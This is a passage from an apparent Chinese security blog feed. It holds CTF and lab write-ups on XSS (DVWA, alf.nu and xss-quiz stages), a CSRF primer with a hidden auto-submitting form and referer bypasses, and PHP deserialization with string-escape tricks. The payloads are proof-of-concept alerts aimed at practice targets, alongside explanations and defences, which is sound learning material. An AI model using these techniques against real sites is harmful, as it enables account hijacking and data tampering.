onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p><pre><code>&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );     // Get input     $message = trim( $_POST[ &apos;mtxMessage&apos; ] );     $name    = trim( $_POST[ &apos;txtName&apos; ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     $message = htmlspecialchars( $message );     // Sanitize name input     $name = stripslashes( $name );     $name = mysql_real_escape_string( $name );     $name = htmlspecialchars( $name );     // Update database     $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );     $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );     $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );     $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p><strong>low</strong>    </p><pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p><pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {    $default = $_GET[&apos;default&apos;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }} </code></pre><p>过滤了 <code>&lt;script</code> ,观察页面源码，手动闭合事件标签 <code>&lt;/option&gt;</code> 、 <code>&lt;/select&gt;</code>，由于代码只检测 <code>$default</code> ,于是我们后面的代码可以逃逸。</p><p>payload:</p><pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p><pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {    # White list the allowable languages    switch ($_GET[&apos;default&apos;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}</code></pre><p>URL 中所有在 # 之后的都会被分割，不会发送到服务端，因此不会被过滤，恶意代码会在创建页面时被用来渲染<br>读取页面内容。</p><p>payload:</p><pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>浏览器如何渲染一个页面，找到一篇国外的文章：<a href="https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969" target="_blank" rel="noopener">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p><p>HTML事件属性：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p><h1 id="下面是另一个-xss-靶场"><a href="#下面是另一个-xss-靶场" class="headerlink" title="下面是另一个 xss 靶场"></a>下面是另一个 xss 靶场</h1><p>靶场地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><pre><code>function escape(s) {  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;}</code></pre><p>对输入的值没有过滤直接拼接到字符串中，闭合前面的标签即可</p><pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><pre><code>function escape(s) {  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;}</code></pre><p>对输入的 <code>&quot;</code> 加了一个转义，但是我们可以闭合 <code>&lt;script&gt;</code> 标签，或者用 <code>\</code> 再次转义</p><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><pre><code>function escape(s) {  s = JSON.stringify(s);  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;}</code></pre><p>与第二题一样</p><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h3><pre><code>function escape(s) {  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);  // URLs  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);  // [[img123|Description]]  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);  return text;}</code></pre><p>第一行过滤将所有 <code>&lt; &quot;</code> 进行实体编码</p><p>第二行将所有 <code>http://S+</code> 替换为 <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,这里 S+ 为匹配一个非空白字符一次或多次。</p><p>第三行将 <code>[[a|b]]</code> 替换为 <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p><p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p><p>输出：</p><pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>通过 <code>http://onerror=alert(1)//</code> 引入 <code>alt=&quot;***&quot;</code> ,此时引号内的内容触发第二行的检测 替换为<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> 此时 <code>href</code> 带来的 <code>&quot;</code> 将 <code>alt</code> 的引号闭合，同时 <code>//</code> 将后面的代码注释掉，造成 <code>http://onerror=alert(1)</code> 逃逸出来。</p><h3 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM"></a>DOM</h3><pre><code>function escape(s) {  // Slightly too lazy to make two input fields.  // Pass in something like &quot;TextNode#foo&quot;  var m = s.split(/#/);  // Only slightly contrived at this point.  var a = document.createElement(&apos;div&apos;);  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));  return a.innerHTML;}</code></pre><p>通过 <code>split</code> 对传入的 s 进行分割<br>    var s=”creat#foo”; var m=s.split(/#/); m<br>    Array [ “creat”, “foo” ]</p><pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>相当于调用了 document.creatXXX() ,这里有几个常用的创建 DOM 节点方法</p><pre><code>createElement() 创建一个元素节点createTextNode() 创建一个文本节点createAttribute() 创建一个属性节点createComment() 创建一个注释节点</code></pre><p>测试最后一个：</p><pre><code>document.createComment(11111);&lt;!-- 11111 --&gt;</code></pre><p>Payload: 闭合注释</p><pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><pre><code>function escape(s) {  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;}</code></pre><p>对输入的 s 全部变成大写，直接输入 <code>alert</code> 变成 <code>ALERT</code> 之后无法执行。</p><p>利用 HTML 编码绕过</p><pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>关于浏览器如何处理编码，贴一篇大佬博客：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p><h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h1 id="http-xss-quiz-int21h-jp"><a href="#http-xss-quiz-int21h-jp" class="headerlink" title="http://xss-quiz.int21h.jp"></a><a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></h1><h2 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h2><p>先尝试 <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p><p>查看源码发现被转义成</p><pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>看起来无法成功了，但是旁边还有个下拉栏，我们抓包试试修改第二个参数：</p><pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! 这一关只是防御了第一个栏位，以后要多留心类似的。</p><h2 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage 4"></a>Stage 4</h2><p>看起来和第三关一样，仍然是先测试，发现被转义，抓包发现多了一个参数 p3 ，首先对新参数进行测试，修改成 <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> 发包发现还是失败，查看源码之后与第二关一样闭合 <code>&quot;&gt;</code> 即可。</p><h2 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage 5"></a>Stage 5</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p><p>发现只显示了一段，<code>F12</code> ，修改长度再测</p><p>没有过滤。</p><p>好了，修改长度，直接插入吧！ </p><p>试完没成功，再看看源码，原来是没闭合 <code>value</code> ，手动闭合提交：</p><p>stage5 的作用只是想告诉我们 <strong>客户端的防护是无效的</strong></p><h2 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage 6"></a>Stage 6</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>被转义，而且没有其他的我们可以控制的栏位，这怎么搞？</p><p>答案是用 html 语法，XSS不是只能插入 JS ，还可以使用 HTML 语法，不用 <code>&lt;&gt;/</code> 利用事件触发</p><pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage 7"></a>Stage 7</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,这次连 <code>&quot;</code> 都转移了</p><p>还是使用 html 语法，使用空格分割属性，加入一个 <code>&quot;</code> 来结束前面的语句</p><h2 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage 8"></a>Stage 8</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , 这次是将输入插入到超链接里，我们直接插入</p><pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>行不通，因为我们点链接发现是 <code>404</code> ，换成 <code>JavaScript</code> 试试</p><pre><code>javascript:alert(document.domain);</code></pre><p>插入后点击链接：</p><h2 id="Stage-9"><a href="#Stage-9" class="headerlink" title="Stage 9"></a>Stage 9</h2><p>不支持 UTF-7 编码，所以跳过</p><h2 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage 10"></a>Stage 10</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html" target="_blank" rel="noopener">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF 简单认识</title>
      <link href="/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-简单认识"><a href="#CSRF-简单认识" class="headerlink" title="CSRF 简单认识"></a>CSRF 简单认识</h1><p>12/22/2019 11:47:20 AM </p><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>跨站请求伪造-Cross Site Request Forgery，也被称作XSRF，简单来说就是 攻击者在不知道某个账户账号密码的情况下，利用目标站点已经登陆过的账户产生的身份凭证信息(cookie)来进行一系列操作，同时该站点认为攻击者所采取的动作都是合法的(因为攻击者盗用了认证通过的账户账号信息)。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果对于某个网站的删除文章功能的代码是 </p><pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;刪除&lt;/a&gt;</code></pre><p>然后在后端做校验，验证 requests 有没有带 session_id ,同时确认是不是这个文章的作者。此时，假如攻击者通过钓鱼，创建了一个有针对性的网页，里面的按钮的代码是：</p><pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;開始測驗&lt;/a&gt;</code></pre><p>如果这时文章作者点击了按钮，那么由于浏览器的跨域请求机制(在浏览器进程的生命周期内，即使浏览器打开了新的Tab页，Session Cookie 也是有效的。Session Cookie 保存在浏览器内存空间内)会把作者的cookie一起带到GET请求中，服务端检查到确实是作者，于是文章被删除了。</p><p>如果禁用了 <code>&lt;img&gt; 、 &lt;iframe&gt; 、 &lt;script&gt;</code> 等带 src 属性的标签，就可以禁止 CSRF 了？这类标签只能发起一次 GET 请求，而不能发起 POST 请求。但是 <code>form</code> 标签可以发送 POST request.</p><pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;開始測驗&quot;/&gt;&lt;/form&gt;</code></pre><p>这样还是显式的，我们可以采用更隐蔽的方式</p><pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>在某些页面中可能进行了 referer 检查，但是我们也要检测是否存在逻辑问题：</p><ol><li>Referer 过滤不严谨</li></ol><p>比如我构造了一个表单 <strong>register</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;csrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;../csrf/server.php&quot; id= &quot;regesiter&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在 server.php 中我对 referer 进行了检测，如果含有 qq.com 我就可以认为是合法的，但是如果我采取以下的请求方式：</p><p><img src="https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg" alt="构造请求"></p><p><img src="https://wx4.sinaimg.cn/small/006boCb9ly1ga5druqi6ej30df047glu.jpg" alt="referer已经含有关键词"></p><ol start="2"><li>空referer</li></ol><p>某些浏览器的防御部署是允许空 REFERER 的。</p><p>还可以使用 burp 自带的 generate CSRF poc,选择测试 URL 右键选择生成 CSRF poc,将要替换的值然后保存访问即可。</p><p>还可以使用 CSRFTester 软件来测试</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ol><li>GET</li></ol><p>如果带有 token 等验证参数，先去掉参数尝试能否正常请求，如果可以即存在 CSRF 漏洞。</p><ol start="2"><li>POST</li></ol><p>最简单的方法就是抓取一个正常请求的数据包，去掉 token 等验证参数后提交，如果正常访问，再去掉 Referer 后重新提交，如果提交还有效，那么基本可以认为存在 CSRF 漏洞，可以构造外部 form 表单来进行提交。如果去掉 referer 失败还可以验证对 referer 校验是否严格尝试绕过。也可能存在代码对请求类型判断不严格($_REQUEST[])，如果 post 失败了尝试改成 get 进行请求。 </p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>强制用户必须与应用完成交互，避免在不知情的情况下构造网络请求</p><h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>检查请求是否来自合法的源，但是不足之处在于浏览器并非什么时候都能取到Referer.</p><h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>将参数加密，或者使用一些真随机数，让攻击者无法猜测到参数值，达到“不可预测性原则”。可以新加一个参数 TOKEN ，同时放在表单和 session 中，服务端只需验证表单中的 TOKEN 和 session 中的 Token 是否一致，一致则认为是合法请求。 </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化与反序列化</title>
      <link href="/2019/12/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2019/12/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p><p><img src="https://i.imgur.com/pBO7lBu.png" alt></p><p>其中index.php代码如下：</p><pre><code>&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p><p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p><p>看一个例子，简单的分析一下：</p><pre><code>&lt;?phpclass Test{public $age = 0;public $name = &apos;brain&apos;;public function PrintInfo(){    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;}}$user =  new Test();$user-&gt;age = 20;$user-&gt;name = &apos;Jack&apos;;$user-&gt;PrintInfo();echo serialize($user);?&gt;</code></pre><p>输出结果如下</p><p><img src="https://i.imgur.com/bqenWI4.png" alt></p><p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p><pre><code>&lt;?phpclass Test{public $variable = &quot;BRAIN&quot;;public $variable1 = &quot;BRAVO&quot;;public function PrintVariable(){    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;}public function __construct(){    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;}public function __destruct(){    echo &apos;__destruct&lt;br /&gt;&apos;;}public function __wakeup(){    echo &apos;__wakeup&lt;br /&gt;&apos;;}public function __sleep(){    echo &apos;__sleep&lt;br /&gt;&apos;;    return array(&apos;variable&apos; , &apos;variable1&apos;);}}    $obj = new Test();  //创建对象时调用__construct$serialized = serialize($obj); //序列化对象时调用__sleepprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);$obj2 = unserialize($serialized); //重建对象调用 __wakeup$obj2-&gt;PrintVariable(); //调用方法输出数据//脚本结束调用__destruct?&gt;</code></pre><p>这是执行结果：</p><p><img src="https://i.imgur.com/Eb6Ax4I.png" alt></p><p>可以看到各个函数的执行顺序。</p><h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p><p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p><pre><code>    idnex.php&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;shield.php&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p><p>我们的想法就是控制$file的值为pctf.php</p><pre><code>&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$a = new Shield(&quot;pctf.php&quot;);echo serialize($a);?&gt;序列化结果O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p><pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p><p><img src="https://i.imgur.com/rAYet4u.png" alt></p><h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p><blockquote><p>1.存在序列化字符串的可控制点或者说是输入点</p><p>2.存在可以利用的魔法函数</p></blockquote><h2 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h2><p>当我们在序列化过程中遇到过滤函数，这种过滤可能是</p><ul><li>过滤后长度增加</li><li>过滤后长度减少</li></ul><p>当要反序列化的字符串长度发生变化时，就可能会出现字符串逃逸的问题。</p><p>比如我现在有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$username = <span class="string">'luc1fer3'</span>;</span><br><span class="line">$pwd = <span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'3'</span>,<span class="string">'22'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$ser = <span class="keyword">array</span>($username,$pwd);</span><br><span class="line">var_dump(serialize($ser)).<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$b = replace(serialize($ser));</span><br><span class="line">var_dump($b).<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">41</span>) <span class="string">"a:2:&#123;i:0;s:8:"</span>luc1fer3<span class="string">";i:1;s:5:"</span>admin<span class="string">";&#125;"</span></span><br><span class="line">string(<span class="number">42</span>) <span class="string">"a:2:&#123;i:0;s:8:"</span>luc1fer22<span class="string">";i:1;s:5:"</span>admin<span class="string">";&#125;"</span> <span class="comment">//属性长度仍然是 8</span></span><br></pre></td></tr></table></figure><p>这是长度增加的情况。现在考虑一种情况：我们要求更改密码为 <code>admin888</code> ，该怎么做？</p><p>首先我们知道如果字符串的长度与序列化后的属性长度不同，反序列化是会报错的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$e = <span class="string">'a:2:&#123;i:0;s:8:"luc1fer3";i:1;s:4:"admin";&#125;'</span>; <span class="comment">//修改长度为4</span></span><br><span class="line">var_dump(unserialize($e));</span><br><span class="line"></span><br><span class="line">PHP Notice:  unserialize(): Error at offset <span class="number">37</span> of <span class="number">41</span> bytes</span><br><span class="line">    bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>并且，php 在反序列化时会把一些字符当作分隔符 <code>}</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$e = <span class="string">'a:2:&#123;i:0;s:8:"luc1fer3";i:1;s:5:"admin";&#125;;i:2;s:2:"ab";&#125;'</span>; <span class="comment">//识别到第一个 &#125; 之后就认为目标字符串结束，后面的会忽略掉。</span></span><br><span class="line">var_dump(unserialize($e));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">8</span>) <span class="string">"luc1fer3"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"admin"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是我们可以想到，如果我们自己构造一个特殊的字符串，手动闭合 <code>}</code> , 那我们就可以强行在反序列化之后塞入一个我们自己的属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$new_pwd = <span class="string">'";i:1;s:8:"admin888";&#125;'</span>; <span class="comment">//length = 22 第一个双引号用来闭合 username</span></span><br></pre></td></tr></table></figure><p>考虑到前面的过滤函数，我们的计划是设法使过滤后的长度增加（因为系列化后的字符串长度增加了，但是属性的长度并不变），让反系列化时系统读取的是过滤后增加的数据，然后把构造的数据变成新的属性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a:2:&#123;i:0;s:51:"luc1fer3333333333333333333333";i:1;s:8:"admin888";&#125;";i:1;s:5:"admin";&#125;'</span> </span><br><span class="line">    <span class="comment">//注意这里我们根据构造的字符串长度增加了21个3，可以看到</span></span><br><span class="line">    luc1fer3333333333333333333333<span class="string">";i:1;s:8:"</span>admin888<span class="string">";&#125; </span></span><br><span class="line"><span class="string">    